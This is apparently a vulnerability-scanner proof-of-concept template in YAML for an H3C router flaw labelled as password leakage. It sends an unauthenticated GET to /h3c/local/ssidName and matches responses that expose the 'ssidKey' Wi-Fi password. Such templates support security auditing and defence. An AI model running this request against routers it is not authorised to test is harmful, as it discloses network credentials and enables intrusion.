id: poc-yaml-h3c-router-password-leakage
info:
  name: H3C 路由器 密码泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: H3C 路由器
requests:
- method: GET
  path: /h3c/local/ssidName
  expression: status_code == 200 && contains(body,"ssidName") && contains(headers,"application/json")
    && matches(body,"\"ssidKey\"\x3a \"[0-9a-zA-Z]+\"")
variables: {}
transport: http
